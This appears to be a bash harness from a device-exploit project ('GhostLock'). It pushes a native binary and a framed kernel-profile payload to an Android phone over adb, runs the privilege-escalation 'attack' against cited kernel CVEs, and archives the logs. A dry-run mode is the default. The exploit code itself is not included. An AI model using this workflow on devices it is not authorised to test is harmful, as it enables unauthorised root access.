#!/usr/bin/env bash
# GhostLock device gate runner (HOST side) -- reproducible privileged payload chain.
#
# USAGE
#   tools/device-guard/run-gate.sh --release <uname -r> [--run] [options]
#
#   --release <str>    device release (uname -r); MUST equal the profile bin name
#   --run              actually run the attack (default: DRY, only proves the chain)
#   --force-attack     pass --force-attack (the App only does this when asked)
#   --serial <serial>  adb serial (default: $ANDROID_SERIAL or the USB device)
#   --binary <path>    default build/native/ghostlock
#   --profiles <dir>   default build/kernel-profiles, falling back to
#                      ~/.ghostlock/build/root/kernel-profiles (Gradle symlink)
#   --archive <dir>    evidence dir (default docs/analysis/device-gates/<ts>)
#   --cpu <a,b>        CPU pair recorded in the evidence (default 0,1)
#   --route <token>    route token recorded in the evidence (default mcast)
#
# PAYLOAD: [4B big-endian length][GLKv3 document] (--enable-status-record). The
# 84-byte channel-B session frame is read ONLY by cve_2026_43284
# (src/core/main.cpp:154-166), so the 43499 path needs no frame.
#
# LOG LOCATION: /sdcard/Download is credential-encrypted storage and is NOT
# mounted before the first unlock, so a post-reboot gate would hang there. The
# script prefers it when it exists (the AGENTS gate location) and otherwise falls
# back to /data/local/tmp/ghostlock-gate/logs; gate-run.txt records which was
# used. Retrieving the device logs is BEST EFFORT -- the verdict is the native
# exit code plus the captured stdout (native-stdout.txt).
#
# PRECONDITIONS: cold boot, KernelSU NOT loaded, fixed CPU pair, single route,
# and the device release must match --release exactly.
#
# SAFETY: nothing here formats, wipes or flashes; it writes /data/local/tmp and
# the device log directory only. DRY mode never executes the attack.
set -euo pipefail

SERIAL="${ANDROID_SERIAL:-}"
RELEASE=""
RUN=0
FORCE=0
BINARY="build/native/ghostlock"
PROFILES="build/kernel-profiles"
PROFILES_FALLBACK="$HOME/.ghostlock/build/root/kernel-profiles"
ARCHIVE=""
CPU="0,1"
ROUTE="mcast"

while [ $# -gt 0 ]; do
  case "$1" in
    --release) RELEASE="${2:-}"; shift 2 ;;
    --run) RUN=1; shift ;;
    --force-attack) FORCE=1; shift ;;
    --serial) SERIAL="${2:-}"; shift 2 ;;
    --binary) BINARY="${2:-}"; shift 2 ;;
    --profiles) PROFILES="${2:-}"; shift 2 ;;
    --archive) ARCHIVE="${2:-}"; shift 2 ;;
    --cpu) CPU="${2:-}"; shift 2 ;;
    --route) ROUTE="${2:-}"; shift 2 ;;
    -h|--help) sed -n "2,35p" "$0"; exit 0 ;;
    *) echo "unknown argument: $1" >&2; exit 2 ;;
  esac
done

fail() { echo "FAIL: $*" >&2; exit 1; }
note() { echo "[gate] $*"; }

# Portable timeout: macOS has no GNU timeout(1). Runs "$@" in the background and
# kills it after $1 seconds; reports 124 on timeout, like timeout(1) does.
run_with_timeout() {
  local secs="$1"; shift
  "$@" &
  local pid=$!
  ( sleep "$secs"; kill -0 "$pid" 2>/dev/null && kill -TERM "$pid" 2>/dev/null ) &
  local watchdog=$!
  local rc=0
  wait "$pid" || rc=$?
  kill "$watchdog" 2>/dev/null || true
  wait "$watchdog" 2>/dev/null || true
  [ "$rc" = 143 ] && rc=124
  return "$rc"
}

[ -n "$RELEASE" ] || fail "--release is required (the device uname -r)"
[ -f "$BINARY" ] || fail "native binary not found: $BINARY (run: make -C src ghostlock)"
BIN_PATH="$PROFILES/$RELEASE.bin"
if [ ! -f "$BIN_PATH" ] && [ -f "$PROFILES_FALLBACK/$RELEASE.bin" ]; then
  PROFILES="$PROFILES_FALLBACK"
  BIN_PATH="$PROFILES/$RELEASE.bin"
fi
[ -f "$BIN_PATH" ] || fail "profile bin not found for $RELEASE (run: ./gradlew :profile-core:exportKernelProfiles)"

if [ -z "$SERIAL" ]; then
  SERIAL="$(adb devices | awk '$2 == "device" && $1 !~ /_adb-tls-connect/ {print $1; exit}')"
  [ -n "$SERIAL" ] || fail "no USB device; pass --serial"
fi
ADB="adb -s $SERIAL"
$ADB get-state >/dev/null 2>&1 || fail "adb cannot reach $SERIAL"
note "serial=$SERIAL"

DEVICE_RELEASE="$($ADB shell uname -r | tr -d "\r")"
[ "$DEVICE_RELEASE" = "$RELEASE" ] || fail "release mismatch: device=$DEVICE_RELEASE arg=$RELEASE"
note "release=$DEVICE_RELEASE (matches)"

if $ADB shell "test -d /sys/module/kernelsu -o -d /data/adb/ksu" >/dev/null 2>&1; then
  note "WARNING: KernelSU looks present/loaded; the gate requires a clean boot"
fi

note "binary sha256=$(shasum -a 256 "$BINARY" | cut -c1-12) bin sha256=$(shasum -a 256 "$BIN_PATH" | cut -c1-12)"

TS="$(date +%Y%m%d-%H%M%S)"
REMOTE_DIR=/data/local/tmp/ghostlock-gate
if $ADB shell "test -d /sdcard/Download" >/dev/null 2>&1; then
  LOG_ROOT="/sdcard/Download/ghostlock-debug-log"
  LOG_KIND="sdcard (AGENTS location)"
else
  LOG_ROOT="$REMOTE_DIR/logs"
  LOG_KIND="data-local-tmp (sdcard not mounted: locked device)"
fi
DEVICE_LOG_DIR="$LOG_ROOT/$TS"
[ -n "$ARCHIVE" ] || ARCHIVE="docs/analysis/device-gates/$TS"
note "device log dir=$DEVICE_LOG_DIR ($LOG_KIND)"

$ADB shell "mkdir -p $REMOTE_DIR" >/dev/null
$ADB push "$BINARY" "$REMOTE_DIR/ghostlock" >/dev/null
$ADB push "$BIN_PATH" "$REMOTE_DIR/profile.bin" >/dev/null
$ADB shell "chmod 755 $REMOTE_DIR/ghostlock" >/dev/null
note "pushed to $REMOTE_DIR"

PAYLOAD="$(mktemp -t ghostlock-payload)"
SIZE="$(wc -c < "$BIN_PATH" | tr -d " ")"
printf "%08x" "$SIZE" | xxd -r -p > "$PAYLOAD"
cat "$BIN_PATH" >> "$PAYLOAD"
note "payload=$PAYLOAD size=$(wc -c < "$PAYLOAD" | tr -d " ") prefix=$(head -c 4 "$PAYLOAD" | xxd -p)"
$ADB push "$PAYLOAD" "$REMOTE_DIR/payload.bin" >/dev/null

FLAGS="--ghostlock-app-call --enable-status-record --dump-kernel-log $DEVICE_LOG_DIR"
[ "$FORCE" = 1 ] && FLAGS="$FLAGS --force-attack"

if [ "$RUN" != 1 ]; then
  note "DRY RUN: feeding an EMPTY payload so the attack cannot start"
  $ADB shell "cd $REMOTE_DIR && : > empty.bin && ./ghostlock --ghostlock-app-call --enable-status-record < empty.bin; echo EXIT=\$?" 2>&1 || true
  note "expected: cannot load profile / non-zero exit (proves binary + framing path)"
  note "the real payload is staged at $REMOTE_DIR/payload.bin and can be replayed with --run"
  exit 0
fi

note "RUNNING the attack: route=$ROUTE cpu=$CPU logs=$DEVICE_LOG_DIR ($LOG_KIND)"
RUN_OUT=/tmp/ghostlock-run.out
set +e
run_with_timeout 240 $ADB shell "cd $REMOTE_DIR && cat payload.bin | ./ghostlock $FLAGS; echo EXIT=\$?" > "$RUN_OUT" 2>&1
RUN_RC=$?
set -e
cat "$RUN_OUT"
[ "$RUN_RC" = 124 ] && note "WARNING: the run hit the 240s timeout"
RUN_EXIT="$(sed -n "s/^EXIT=//p" "$RUN_OUT" | tail -1)"
note "native exit=${RUN_EXIT:-unknown}"

mkdir -p "$ARCHIVE"
cp "$RUN_OUT" "$ARCHIVE/native-stdout.txt"
{
  echo "release=$RELEASE"
  echo "route=$ROUTE"
  echo "cpu=$CPU"
  echo "serial=$SERIAL"
  echo "native_exit=${RUN_EXIT:-unknown}"
  echo "device_log_dir=$DEVICE_LOG_DIR"
  echo "device_log_kind=$LOG_KIND"
} > "$ARCHIVE/gate-run.txt"

set +e
run_with_timeout 30 $ADB shell "ls -la $DEVICE_LOG_DIR" > /tmp/ghostlock-logs.out 2>&1
LS_RC=$?
set -e
if [ "$LS_RC" = 0 ]; then
  cat /tmp/ghostlock-logs.out
  cp /tmp/ghostlock-logs.out "$ARCHIVE/device-log-listing.txt"
  set +e
  run_with_timeout 30 $ADB pull "$DEVICE_LOG_DIR" "$ARCHIVE/" >/dev/null 2>&1
  PULL_RC=$?
  set -e
  if [ "$PULL_RC" = 0 ]; then
    note "device logs archived to $ARCHIVE ($LOG_KIND)"
  else
    note "WARNING: could not pull $DEVICE_LOG_DIR (rc=$PULL_RC); stdout evidence kept"
  fi
else
  note "WARNING: no device log listing ($DEVICE_LOG_DIR, $LOG_KIND); stdout evidence kept"
fi

[ "$RUN_EXIT" = "0" ] || fail "native exited ${RUN_EXIT:-unknown} (see $ARCHIVE/native-stdout.txt)"
note "PASS: route=$ROUTE cpu=$CPU release=$RELEASE archive=$ARCHIVE"